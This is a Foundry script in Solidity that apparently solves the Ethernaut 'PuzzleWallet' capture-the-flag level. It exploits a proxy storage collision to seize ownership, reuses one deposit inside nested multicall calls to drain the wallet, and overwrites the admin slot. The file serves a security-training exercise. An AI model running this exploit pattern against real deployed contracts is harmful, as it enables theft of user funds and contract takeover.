// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/PuzzleProxy.sol";

contract PuzzleProxyScript is Script {
    PuzzleProxy proxy;
    PuzzleWallet wallet;
    bytes[] public multicall_data;
    bytes[] public deposit_data;
    function setUp() public {
        proxy = PuzzleProxy(payable(0xdA3B22683B4e9a8b2106Ae30Cd1B4485FBE25F8d));
        wallet = PuzzleWallet(0xdA3B22683B4e9a8b2106Ae30Cd1B4485FBE25F8d);
    }

    function run() public {
        vm.startBroadcast();

        proxy.proposeNewAdmin(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C);
        (bool res,) = address(proxy).call(abi.encodeWithSignature("addToWhitelist(address)", 0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C));
        require(res);

        console.log("proxy admin ", proxy.admin());
        console.log("wallet owner ", wallet.owner());
        console.log("whitelisted ", wallet.whitelisted(address(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C)));
        console.log("before wallet contract balance: ", address(wallet).balance);

        // push calldata
        deposit_data.push(abi.encodeWithSignature("deposit()"));
        multicall_data.push(abi.encodeWithSignature("multicall(bytes[])", deposit_data));
        multicall_data.push(abi.encodeWithSignature("deposit()"));
        multicall_data.push(abi.encodeWithSignature("execute(address,uint256,bytes)", 0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C, 0.001 ether * 2, ""));

        (res, ) = address(proxy).call{value: 0.001 ether}(abi.encodeWithSignature("multicall(bytes[])", multicall_data));
        require(res);
        console.log("balance : ", address(proxy).balance);

        (res, ) = address(proxy).call(abi.encodeWithSignature("setMaxBalance(uint256)", 0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C));
        require(res);

        console.log("admin: ", proxy.admin());
        vm.stopBroadcast();
    }
}
